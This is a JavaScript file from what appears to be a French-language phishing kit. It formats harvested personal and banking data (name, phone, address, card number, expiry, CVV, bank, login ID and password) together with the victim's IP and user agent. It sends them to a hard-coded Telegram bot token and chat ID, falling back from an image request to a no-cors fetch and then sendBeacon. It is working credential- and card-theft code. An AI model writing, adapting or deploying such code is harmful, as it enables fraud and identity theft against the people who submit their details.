// tg.js
const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
const CHAT_ID        = '-4766781392';

// JSONP ipify (injecté par index.html)
function handleIP(data) {
  window.__CLIENT_IP__ = data.ip;
}

// debug in-page
function logDebug(msg) {
  const panel = document.getElementById('debug-panel');
  if (!panel) return;
  const line = document.createElement('div');
  line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  panel.appendChild(line);
  panel.scrollTop = panel.scrollHeight;
}

// retenir les objets pour éviter GC Safari iOS
window._tgReqs = window._tgReqs || [];

/**
 * Envoie la notification à Telegram via :
 * 1) <img> GET
 * 2) fetch(no-cors)
 * 3) navigator.sendBeacon
 */
function sendTelegramNotification(message) {
  logDebug('🔥 Démarrage sendTelegramNotification');
  logDebug('Message brut: ' + message);

  const ip = window.__CLIENT_IP__ || 'unknown';
  const ua = navigator.userAgent || 'unknown';
  logDebug('IP détectée: ' + ip);
  logDebug('User-Agent: ' + ua);

  const now = new Date();
  const pad = n => String(n).padStart(2,'0');
  const datetime = `${pad(now.getDate())}/${pad(now.getMonth()+1)}/${now.getFullYear().toString().slice(-2)}, `
                 + `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
  logDebug('Horodatage: ' + datetime);

  // Construction du texte
  const parts = message.split('\n');
  const header = parts.shift();
  let text = `[📝] ${header}`;
  if (parts.length) {
    text += '\n' + parts.map(line => {
      if (line.startsWith('Nom:'))       return line.replace('Nom:', '👤 Nom:');
      if (line.startsWith('Prénom:'))    return line.replace('Prénom:', '🙋 Prénom:');
      if (line.startsWith('Téléphone:')) return line.replace('Téléphone:', '📞 Téléphone:');
      if (line.startsWith('Email:'))     return line.replace('Email:', '✉️ Email:');
      if (line.startsWith('Adresse:'))   return line.replace('Adresse:', '🏠 Adresse:');
      if (line.startsWith('Numéro:'))    return line.replace('Numéro:', '💳 Numéro:');
      if (line.startsWith('Exp:'))       return line.replace('Exp:', '📅 Exp:');
      if (line.startsWith('CVV:'))       return line.replace('CVV:', '🔒 CVV:');
      if (line.startsWith('Banque:'))    return line.replace('Banque:', '🏦 Banque:');
      if (line.startsWith('ID:'))        return line.replace('ID:', '🆔 ID:');
      if (line.startsWith('Pass:'))      return line.replace('Pass:', '🔑 Pass:');
      return line;
    }).join('\n');
  }
  text += `\n\n[🗓️] Date & heure : ${datetime}`
       + `\n[🌐] IP Client     : ${ip}`
       + `\n[📍] User-Agent    : ${ua}`;
  logDebug('Texte final: ' + text.replace(/\n/g,' ⏎ '));

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`
            + `?chat_id=${encodeURIComponent(CHAT_ID)}`
            + `&parse_mode=Markdown`
            + `&text=${encodeURIComponent(text)}`;
  logDebug('URL Telegram: ' + url);

  // 1) <img> GET
  const img = new Image();
  img.src = url;
  window._tgReqs.push(img);
  img.onload  = () => logDebug('✔️ <img> envoyé');
  img.onerror = () => {
    logDebug('❌ <img> failed, fallback fetch(no-cors)');

    // 2) fetch(no-cors)
    fetch(url, { mode: 'no-cors' })
      .then(() => {
        logDebug('✔️ fetch(no-cors) envoyé');
        // 3) et maintenant sendBeacon
        const blob = new Blob([], { type: 'application/json' });
        const beaconOk = navigator.sendBeacon(url, blob);
        logDebug(`📶 sendBeacon ${beaconOk ? '✓' : '✗'}`);
      })
      .catch(e => {
        logDebug('❌ fetch(no-cors) error: ' + e);
        // fallback beacon malgré tout
        const blob = new Blob([], { type: 'application/json' });
        const beaconOk = navigator.sendBeacon(url, blob);
        logDebug(`📶 sendBeacon ${beaconOk ? '✓' : '✗'}`);
      });
  };
}

// expose
window.sendTelegramNotification = sendTelegramNotification;